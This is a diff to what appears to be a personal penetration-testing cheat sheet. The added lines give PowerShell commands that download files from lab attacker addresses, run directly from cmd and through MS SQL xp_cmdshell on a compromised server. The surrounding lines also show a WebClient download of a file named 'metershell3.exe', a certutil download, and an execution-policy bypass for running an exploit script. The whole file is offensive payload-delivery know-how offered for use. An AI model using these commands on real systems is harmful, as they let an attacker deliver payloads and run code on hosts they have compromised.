@@ -229,6 +229,13 @@ a. Network Exploitation
 		Downloading Files from the Internet
 		Invoke-WebRequest -Uri "http://example.com/payload.exe" -OutFile "C:\temp\payload.exe" 
 		
+		from cmd:
+		powershell Invoke-WebRequest -Uri "http://10.10.174.147:1235/haha.txt" -OutFile "C:\tmp\haha.txt"
+
+		from MS_Sql xp_cmdshell: (Note from MS_SQL, you can only use this command below:)
+		EXECUTE xp_cmdshell 'powershell Invoke-WebRequest -Uri "http://10.10.174.147:1235/haha.txt" -OutFile "C:\tmp\haha.txt"';
+		
+
 		Bypassing Execution Policy for Script Execution - This runs a PowerShell script while bypassing the execution policy for this instance only.
 		powershell.exe -ExecutionPolicy Bypass -File .\exploit.ps1 
 		
@@ -686,6 +693,17 @@ f.) Some other Powershell commands:
 Download a file:
 powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.31:8000/metershell3.exe', 'metershell3.exe')"
 certutil -urlcache -f URL-link/file.txt file.txt
+
+Downloading Files from the Internet
+Invoke-WebRequest -Uri "http://example.com/payload.exe" -OutFile "C:\temp\payload.exe" 
+		
+from cmd:
+powershell Invoke-WebRequest -Uri "http://10.10.174.147:1235/haha.txt" -OutFile "C:\tmp\haha.txt"
+
+from MS_Sql xp_cmdshell: (Note from MS_SQL, you can only use this command below:)
+EXECUTE xp_cmdshell 'powershell Invoke-WebRequest -Uri "http://10.10.174.147:1235/haha.txt" -OutFile "C:\tmp\haha.txt"';
+
+
 Run Powershell as another user:
 runas /user:domain\username "powershell.exe"
 Allow Powershell run script:
